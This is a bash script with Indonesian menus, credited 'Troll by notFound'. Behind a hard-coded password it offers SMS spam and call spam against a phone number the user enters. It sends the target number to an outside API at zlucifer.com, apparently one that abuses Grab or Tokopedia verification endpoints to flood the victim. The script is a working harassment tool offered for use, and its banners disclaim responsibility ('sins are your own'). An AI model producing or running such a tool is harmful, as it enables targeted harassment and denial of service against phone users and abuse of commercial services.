troll(){
    clear
echo
    echo "==============================="
	sleep 0.2
    echo "===--->Troll by notFound<---==="
	sleep 0.2
    echo "==============================="
	date
echo
echo "-------------------------------"
echo "--GUNAKAN DENGAN BIJAK!"
echo "--DOSA TANGGUNG SENDIRI"
echo "-------------------------------"
}
login (){
    echo "masukan password!"
     read pass
     if [ $pass = "N0t" ]; then
                 spam
    else 
                 echo "password SALAH"
echo
                 login
    fi
}
get_sms=$(curl -s http://zlucifer.com/api/sms.php)
get_call=$(curl -s http://zlucifer.com/api/call.php)
mulai (){
    echo "Gunakan Tools Lagi?"
    echo "y/n?"
    echo
    read lagi
    if [ $lagi = "y" ]; then
            spam
    else
            echo "Gunakan Dengan Bijak!"
    fi
}
#spam
spam(){
    clear
    troll
    echo
echo "Menu tool"
    echo "[1] Spam SMS"
    echo "[2] Spam Telp"
    echo "[3] Close tools "
    echo
    echo "Pilih Menu 1 / 2 / 3?"
    read pilih
    if [ $pilih = "1" ]; then
            echo
            echo "Spam chat"
            echo
            echo "Silahkan masukan nomor telp target"
            echo contoh 0812345678
echo
            read target # masukin no telp
            echo
            echo "Berapa sms yang mau dikirim?"
            read paket
            echo
            echo Apakah nomor $target "dan SMS dikirim "$paket" sudah benar?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                    load
                    clear
                    echo Melakukan spam SMS ke nomor $target
                    echo
                    echo "Jangan close aplikasi sebelum spam selesai"
                    echo "========================================="
                    target_do=$get_sms'/sms.php?nomor='$target'&paket='$paket
                    CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
                    echo " Gunakan tools dengan bijak"
                    echo
                    echo 
                    echo " -NotFound"
                    echo "========================================="
            else
                    echo "Kesalahan"
            fi
        mulai
    elif [ $pilih = "2" ]; then
            echo "Spam Call"
            echo
            echo "Silahkan masukan nomor telp target"
            echo contoh 0812345678
echo
            read target # masukin no telp
            echo
            echo "Gunakan API Grab/Toped?"
            echo "[1] GRAB"
            echo "[2] TOPED"
            echo "1/2?"
            read api
            if [ $api = "1" ]; then
                  api_spam="grab"
            else
                  api_spam="toped"
            fi
            echo Apakah nomor $target dan spam menggunakan $api_spam "sudah benar?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                  load
                  clear
                  echo Melakukan spam call ke nomor $target
                  echo
                  echo "Jangan close aplikasi sebelum spam selesai"
                  echo "========================================"
                  cek_target=`curl -s $get_call/call.php?nomor=$target"&method="$api_spam`
                  echo -e $cek_target
                  echo " Gunakan tools dengan bijak"
                  echo
                  echo 
                  echo " NotFound "
                  echo "========================================"
            else
                  echo Kesalahan, silahkan coba lagi
            fi
        mulai
    elif [ $pilih = "3" ]; then
        echo "Dosa Tanggung Sendiri"
        close
    else
        clear
        echo "Kesalahan"
        mulai
    fi
}
close(){
    exit
}
clear
login
